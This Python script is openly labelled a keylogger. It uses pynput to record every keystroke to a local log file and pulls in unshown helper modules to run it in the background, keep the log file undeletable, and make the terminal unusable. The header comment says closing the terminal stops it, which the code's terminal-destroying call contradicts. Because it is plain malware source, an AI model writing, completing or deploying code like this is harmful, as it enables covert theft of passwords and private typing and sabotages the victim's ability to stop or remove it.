# This code is a keylogger that captures keystrokes and saves them to a file named "logs.txt". It uses the `pynput` library to listen for keyboard events. The `on_press` function is called whenever a key is pressed, and it appends the key to the log file. The listener runs indefinitely until the program is terminated, which can be done by closing the terminal running the script.

from pynput.keyboard import Key, Listener
from test import run_forever 
from test1 import make_file_undeletable
import background_runner
import make_terimnal_unusable

LOG_FILE = "logs.txt"


def on_press(key):
    """Log each keystroke to logs.txt."""
    try:
        with open(LOG_FILE, "a") as file:
            file.write(f"{key}\n")
    except Exception as e:
        print(f"Error logging keystroke: {e}")


def start_keylogger():
    """Start the keylogger listener."""
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"Keylogger failed to start: {e}")
        raise

if __name__ == "__main__":
    background_runner.run_in_background(start_keylogger)
    background_runner.run_in_background(run_forever)
    background_runner.run_in_background(make_file_undeletable, LOG_FILE)
    make_terimnal_unusable.terminalDestroyer()